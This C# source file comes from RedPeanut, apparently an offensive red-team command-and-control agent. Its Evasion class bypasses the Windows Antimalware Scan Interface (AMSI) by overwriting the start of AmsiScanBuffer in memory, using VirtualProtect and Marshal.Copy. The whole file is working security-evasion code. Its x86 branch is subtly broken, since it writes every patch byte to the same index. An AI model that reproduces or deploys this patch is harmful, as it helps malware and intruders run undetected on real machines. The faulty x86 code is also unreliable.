//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace RedPeanutAgent.Core
{
    public class Evasion
    {
        /// <summary>
        /// Patch the AmsiScanBuffer function in amsi.dll.
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <remarks>
        /// Credit to Adam Chester (@_xpn_).
        /// </remarks>
        
        static byte[] x64 = new byte[6];

        static byte[] x86 = new byte[8];

        public static void Evade(bool evade)
        {
            if (!evade)
                return;

            if (is64Bit())
            {
                x64[0] = 0xB8;
                x64[1] = 0x57;
                x64[2] = 0x00;
                x64[3] = 0x07;
                x64[4] = 0x80;
                x64[5] = 0xC3;
                FunnyAmsi(x64);
            }
            else
            {
                x86[0] = 0xB8;
                x86[0] = 0x57;
                x86[0] = 0x00;
                x86[0] = 0x07;
                x86[0] = 0x80;
                x86[0] = 0xC2;
                x86[0] = 0x18;
                x86[0] = 0x00;
                FunnyAmsi(x86);
            }
        }

        private static void FunnyAmsi(byte[] patch)
        {
            try
            {
                var lib = RedPeanutAgent.Core.Natives.LoadLibrary("amsi.dll");
                var addr = RedPeanutAgent.Core.Natives.GetProcAddress(lib, "AmsiScanBuffer");

                uint oldProtect;
                RedPeanutAgent.Core.Natives.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, addr, patch.Length);

                RedPeanutAgent.Core.Natives.VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }

        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
    }
}
